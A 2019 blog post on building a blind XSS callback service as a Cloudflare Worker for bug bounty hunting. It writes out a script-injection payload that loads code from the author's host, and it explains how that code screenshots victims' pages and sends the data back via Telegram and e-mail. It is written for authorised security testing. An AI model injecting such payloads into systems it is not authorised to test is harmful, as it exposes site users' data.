---
layout: post
title: "Serverless Blind XSS hunter with Cloudflare Workers"
date: 2019-09-11 00:00:00 -0000
categories: ['Ethical hacking', 'Tools']
tags: [blind xss, cloudflare, cloudflare worker, serverless, xss, xss hunter]
author: vavkamil
redirect_from:
  - /2019/09/11/serverless-blind-xss-hunter-with-cloudflare-workers/
---

<hr>

<!-- wp:paragraph -->
<p>If you are not familiar with <strong><a rel="noreferrer noopener" aria-label="XSS Hunter (opens in a new tab)" href="https://xsshunter.com/" target="_blank">XSS Hunter</a></strong> by <a rel="noreferrer noopener" aria-label="@IAmMandatory (opens in a new tab)" href="https://twitter.com/IAmMandatory" target="_blank">@IAmMandatory</a>, it's an awesome tool for penetration testers and bug bounty hunters that allows easily hunt for blind XSS vulnerabilities. It's <a rel="noreferrer noopener" aria-label="open-source (opens in a new tab)" href="https://github.com/mandatoryprogrammer/xsshunter" target="_blank">open-source</a> with a ton of features. You can use the SaaS version, <a rel="noreferrer noopener" aria-label="deploy it youself (opens in a new tab)" href="https://thehackerblog.com/xss-hunter-is-now-open-source-heres-how-to-set-it-up/" target="_blank">deploy it yourself</a> or even go serverless with <a rel="noreferrer noopener" aria-label="Refinery (opens in a new tab)" href="https://app.refinery.io/import?q=ymec5nkycnt4" target="_blank">Refinery</a>! You should absolutely give it a try :)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I was thinking about writing something similar for a while. I just wanted something way simpler, where I could experiment with different payloads, CSP bypasses and other stuff. Right now it can grab basic info about the visitor and website, take a screenshot and notify me on Telegram and E-mail. If you are fancier, you can easily add support for Slack or Discord notifications ...</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>TLDR;</strong> I did a simple XSS hunter as a Cloudflare Worker, source code is here: <a rel="noreferrer noopener" aria-label="https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e (opens in a new tab)" href="https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e" target="_blank">https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e</a></p>
<!-- /wp:paragraph -->

<!-- wp:gallery {"ids":[596,597,598],"columns":3} -->
<figure class="wp-block-gallery columns-3 is-cropped"><ul class="blocks-gallery-grid"><li class="blocks-gallery-item"><figure><img src="{{ '/assets/img/2019/09/Screenshot_20190911-142246_Telegram.png' | relative_url }}" alt="" data-id="596" class="wp-image-596"/><figcaption class="blocks-gallery-item__caption">Telegram notification</figcaption></figure></li><li class="blocks-gallery-item"><figure><img src="{{ '/assets/img/2019/09/Screenshot-from-2019-09-11-14-28-00.png' | relative_url }}" alt="" data-id="597" data-link="https://vavkamil.cz/?attachment_id=597" class="wp-image-597"/><figcaption class="blocks-gallery-item__caption">E-mail notification</figcaption></figure></li><li class="blocks-gallery-item"><figure><img src="{{ '/assets/img/2019/09/Screenshot-from-2019-09-11-14-28-23.png' | relative_url }}" alt="" data-id="598" data-link="https://vavkamil.cz/?attachment_id=598" class="wp-image-598"/><figcaption class="blocks-gallery-item__caption">Screenshot example</figcaption></figure></li></ul></figure>
<!-- /wp:gallery -->

<!-- wp:html -->
<center>
<figure class="wp-block-embed-twitter aligncenter wp-block-embed is-type-rich is-provider-twitter"><div class="wp-block-embed__wrapper">
https://twitter.com/vavkamil/status/1171460639434276869
</div></figure>
</center>
<!-- /wp:html -->

<!-- wp:heading {"level":3} -->
<h3>WTF is CF Worker?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Cloudflare Workers are cheap and powerful service, where you can deploy serverless code all around the world. That allows you to create entirely new applications that behave similar to JavaScript in the browser. Using a CF Worker, you can modify your site’s HTTP requests and responses, make parallel requests, or generate responses from the edge.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Getting started</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Assuming you already have Cloudflare account, just select any domain and start right away, or you can create custom <a rel="noreferrer noopener" aria-label="workers.dev (opens in a new tab)" href="https://workers.dev" target="_blank">workers.dev</a> subdomain. Once finished, you can start hunting for blind XSS with simple payload e.g.:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>'">&lt;script src=//xss.vavkamil.cz/blind.js>&lt;/script></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>With paid Cloudflare plan, please highly consider using <a href="https://blog.cloudflare.com/building-with-workers-kv/" target="_blank" rel="noreferrer noopener" aria-label="Workers KV (opens in a new tab)">Workers KV</a> (Key-Value Store) for storing secrets.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Starting with Telegram, you will need to create a bot and get the API token. It's <a rel="noreferrer noopener" aria-label="really easy (opens in a new tab)" href="https://core.telegram.org/bots#3-how-do-i-create-a-bot" target="_blank">really easy</a>, just talk to <a rel="noreferrer noopener" aria-label="@BotFather (opens in a new tab)" href="https://telegram.me/botfather" target="_blank">@BotFather</a> and give it a name. Next, you will need to provide the bot with your user ID. Just talk to <a rel="noreferrer noopener" aria-label="@RawDataBot (opens in a new tab)" href="https://telegram.me/RawDataBot" target="_blank">@RawDataBot</a> or <a rel="noreferrer noopener" aria-label="@userinfobot (opens in a new tab)" href="https://telegram.me/userinfobot" target="_blank">@userinfobot</a> and they will respond with your ID.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","highlightNumbers":"9,11","lineNumbers":"9-11"} /-->

<!-- wp:paragraph -->
<p>To be able to send e-mails, my best recommendation is to use <a rel="noreferrer noopener" aria-label="Mailgun (opens in a new tab)" href="https://www.mailgun.com/" target="_blank">Mailgun</a>. I'm really happy with the service that they are offering and you can configure it in 5 minutes (too lazy to write a step-by-step guide). Great for simulated phishing awareness too :)</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","highlightNumbers":"14,15,17,18","lineNumbers":"13-19"} /-->

<!-- wp:paragraph -->
<p>The last part of the secrets is your Cloudflare worker route. Decide which path you want to use, once you are finished, create the route and pair the worker with it.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","highlightNumbers":"21","lineNumbers":"21"} /-->

<!-- wp:paragraph -->
<p>There comes the interesting stuff. Our blind.js script can behave differently based on the GET/POST requests and parameters. If it receives POST data from successful blind XSS attack, it will pass info about the website along with the screenshot to Telegram and e-mail.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","highlightNumbers":"50","lineNumbers":"50-60"} /-->

<!-- wp:paragraph -->
<p>I had some problems with message limits on Telegram side due to a huge base64 encoded strings, so I'm just sending basic notification and more detailed info is send to e-mail.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","lineNumbers":"65-74"} /-->

<!-- wp:paragraph -->
<p>Sending messages from Telegram bot is very easy, you can even use HTML/markdown or just a plain text.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","lineNumbers":"79-86"} /-->

<!-- wp:paragraph -->
<p>Same goes for Mailgun, just pass the basic HTTP auth headers and you are good to go.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","lineNumbers":"91-103"} /-->

<!-- wp:paragraph -->
<p>You can even send a response to your victim after the successful execution :)</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","lineNumbers":"108-111"} /-->

<!-- wp:paragraph -->
<p>When the Workers route is requested via GET, there are three possibilities what can happen.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>With the <code>base64</code> parameter, it will decode the string and respond with the screenshot. I have implemented it this way because at the time it's not possible to do stuff with files or buffer, but it would be way more elegant to just send the screenshot as an attachment ...</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","lineNumbers":"123-131"} /-->

<!-- wp:paragraph -->
<p>This part is bothering me. To be able to do a screenshot of the victim's browser, you need to somehow serve html2canvas.min.js. With <code>html2canvas=1</code> parameter, it will do just that. This way it's possible to get the content from 3rd party domain and serve it from our origin, but it's a huge privacy risk. I was thinking about it and will probably just leverage Cloudflare cache and add hash checking mechanism to notice changes in the remote code.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","lineNumbers":"132-138"} /-->

<!-- wp:paragraph -->
<p>And the last part is the most important one. This is the payload that will be injected everywhere :) It will inject <code>html2canvas.min.js</code> and after the screenshot is ready, POST request with the data is fired to the worker to process.</p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e","highlightNumbers":"150","lineNumbers":"143-161"} /-->

<!-- wp:paragraph -->
<p>I hope that it's not a total garbage script and somebody will appreciate it :) Have a lucky bug hunting ...</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><a href="https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e">https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e</a></p>
<!-- /wp:paragraph -->

<!-- wp:gistr/custom-block {"content":"d40e3b8dd1373445506517684959531e"} /-->